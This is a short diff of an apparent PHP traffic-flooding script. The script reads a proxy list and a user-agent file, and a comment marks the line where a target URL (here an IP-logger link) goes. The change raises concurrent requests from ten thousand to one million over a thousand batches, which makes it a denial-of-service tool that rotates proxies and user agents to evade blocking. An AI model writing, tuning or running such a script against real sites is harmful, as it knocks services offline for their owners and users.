@@ -4,7 +4,7 @@ $proxies = file($proxyFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
 
 $url = "https://grabify.link/T3CS3I"; // HI GHOST TARGET URL PUT HERE.
 
-$maxConcurrentRequests = 10000;
+$maxConcurrentRequests = 1000000;
 $totalBatches = 1000;
 
 $userAgentFile = 'useragent.txt';
